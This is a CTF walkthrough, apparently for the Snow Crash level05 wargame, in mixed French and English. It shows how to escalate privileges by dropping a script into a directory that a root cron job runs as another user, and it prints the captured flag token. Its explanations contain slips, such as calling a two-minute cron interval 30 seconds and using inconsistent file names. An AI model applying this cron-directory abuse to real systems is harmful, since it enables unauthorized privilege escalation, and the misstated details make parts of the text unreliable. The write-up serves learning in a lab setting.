As soon as you log in to level05, a notification appears :
<pre><code>You have new mail.</code></pre>

On fait un **cat** du mail reçu, qui se situe dans <code>/var/mail/level05</code> :
<pre><code>> cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
</code></pre>

Il s'agit d'une tâche **cron** dont le format est le suivant :
<pre>
*/2	*	*	*	*
minute	hour	day	month	day
</pre>
> So every 30 seconds the task: <code>su -c 'sh /usr/sbin/openarenaserver"</code> will be executed

We **cat** the file <code>/usr/sbin/openarenaserve</code>, which gives us :
```sh
#!/bin/sh
for i in /opt/openarenaserver/* ; do
# For each file in the folder
		(ulimit -t 5; bash -x "$i")
		# With an interval of 5 sc, execute the file
		rm -f "$i"
		# Delete the file
done
```

The idea is to create a file that we will put in the folder <code>/opt/openarenaserver/</code> so that it will run as soon as the task **cron** is activated :
<pre><code>echo "getflag > /tmp/token" > /tmp/getflag.sh
mv /tmp/getflag.sh /opt/openarenaserver/getflash.sh
</code></pre>
> We store in <code>/tmp/token</code> the result because **cron** takes place in background and does not display a message.

We just have to make **ls** of <code>/opt/openarenaserver/</code> and wait for the file <code>/tmp/getflag.sh</code> to be deleted to know when the task has been done, so we just have to retrieve the flag :
<pre><code>> cat /tmp/token
Check flag.Here is your token : viuaaale9huek52boumoomioc
</code></pre>